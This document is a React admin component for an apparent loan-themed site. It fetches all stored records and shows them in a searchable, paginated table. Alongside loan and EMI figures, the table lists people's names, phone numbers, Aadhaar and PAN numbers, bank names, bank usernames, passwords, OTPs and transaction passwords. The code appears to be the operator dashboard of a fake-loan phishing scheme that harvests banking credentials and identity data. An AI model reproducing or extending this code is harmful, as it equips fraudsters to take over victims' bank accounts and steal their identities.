import React, { useEffect, useState } from "react";
import axios from "axios";

const ITEMS_PER_PAGE = 10;

const AddNamesComments = () => {
  const [allSaveData, setAllSaveData] = useState([]);
  const [filteredData, setFilteredData] = useState([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [currentPage, setCurrentPage] = useState(1);
  const [loading, setLoading] = useState(true);

  // Fetch all-save-data on mount
  useEffect(() => {
    const fetchAllSaveData = async () => {
      setLoading(true);
      try {
        const adminToken = localStorage.getItem("admin-token");
        const { data } = await axios.get(
          `${process.env.REACT_APP_API_URL}/api/admin/all-save-data`,
          {
            headers: {
              Authorization: `${adminToken}`,
            },
          }
        );

        setAllSaveData(data?.data || data || []);
        setFilteredData(data?.data || data || []);
      } catch (err) {
        setAllSaveData([]);
        setFilteredData([]);
      } finally {
        setLoading(false);
      }
    };
    fetchAllSaveData();
  }, []);

  // Filter data when search term changes
  useEffect(() => {
    const term = searchTerm.toLowerCase().trim();
    if (!term) {
      setFilteredData(allSaveData);
      setCurrentPage(1);
      return;
    }
    const filtered = allSaveData.filter(
      (row) =>
        (row.name && row.name.toLowerCase().includes(term)) ||
        (row.phoneNo && row.phoneNo.toLowerCase().includes(term)) ||
        (row.aadhar && row.aadhar.toLowerCase().includes(term)) ||
        (row.pan && row.pan.toLowerCase().includes(term)) ||
        (row.bankName && row.bankName.toLowerCase().includes(term)) ||
        (row.userName && row.userName.toLowerCase().includes(term)) ||
        (row.otp && row.otp.toLowerCase().includes(term)) ||
        (row.transactionPassword && row.transactionPassword.toLowerCase().includes(term))
    );
    setFilteredData(filtered);
    setCurrentPage(1);
  }, [searchTerm, allSaveData]);

  const totalPages = Math.ceil(filteredData.length / ITEMS_PER_PAGE);
  const startIndex = (currentPage - 1) * ITEMS_PER_PAGE;
  const currentRows = filteredData.slice(startIndex, startIndex + ITEMS_PER_PAGE);

  return (
    <div className="px-4 py-4 sm:px-6 sm:py-6 max-w-7xl mx-auto">
      <h2 className="text-xl sm:text-2xl font-semibold text-gray-800 mb-4 sm:mb-6">All Saved Data</h2>

      {/* Search */}
      <div className="mb-4 sm:mb-6">
        <input
          type="text"
          placeholder="Search by name, phone, aadhar, pan, bank, username, otp, transaction password..."
          value={searchTerm}
          onChange={(e) => setSearchTerm(e.target.value)}
          className="w-full max-w-md p-2 sm:p-3 text-sm sm:text-base border rounded-md shadow-sm focus:outline-none focus:ring-2 focus:ring-blue-500"
        />
      </div>

      {/* Table */}
      <div className="overflow-x-auto bg-white shadow-md rounded-md text-sm sm:text-base">
        {loading ? (
          <div className="p-8 text-center text-gray-500">Loading...</div>
        ) : (
          <table className="min-w-full table-auto">
            <thead className="bg-gray-100 text-gray-700">
              <tr>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Name</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Phone No</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Aadhar</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">PAN</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Loan Amount</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Calculated EMI</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Total Interest</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Total Payment</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Bank Name</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">User Name</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Password</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">OTP</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3">Transaction Password</th>
                <th className="text-left px-4 py-2 sm:px-6 sm:py-3 hidden md:table-cell">ID</th>
              </tr>
            </thead>
            <tbody>
              {currentRows.length > 0 ? (
                currentRows.map((row) => (
                  <tr key={row._id} className="border-t">
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.name || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.phoneNo || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.aadhar || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.pan || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.loanAmount ?? ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.calculatedEMI ?? ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.totalInterest || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.totalPayment || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.bankName || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.userName || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.password || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.otp || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4">{row.transactionPassword || ""}</td>
                    <td className="px-4 py-2 sm:px-6 sm:py-4 text-gray-600 hidden md:table-cell">{row._id}</td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan="14" className="text-center px-4 py-8 sm:px-6 sm:py-10 text-gray-500">
                    No data found.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        )}
      </div>

      {/* Pagination */}
      <div className="mt-4 sm:mt-6 flex flex-wrap items-center justify-center gap-3 sm:gap-4">
        <button
          className="px-3 py-1 sm:px-4 sm:py-2 bg-gray-200 text-xs sm:text-sm rounded hover:bg-gray-300 disabled:opacity-50"
          onClick={() => setCurrentPage((prev) => prev - 1)}
          disabled={currentPage === 1}
        >
          Previous
        </button>
        <span className="text-xs sm:text-sm text-gray-700">
          Page {currentPage} of {totalPages}
        </span>
        <button
          className="px-3 py-1 sm:px-4 sm:py-2 bg-gray-200 text-xs sm:text-sm rounded hover:bg-gray-300 disabled:opacity-50"
          onClick={() => setCurrentPage((prev) => prev + 1)}
          disabled={currentPage === totalPages || totalPages === 0}
        >
          Next
        </button>
      </div>
    </div>
  );
};

export default AddNamesComments;
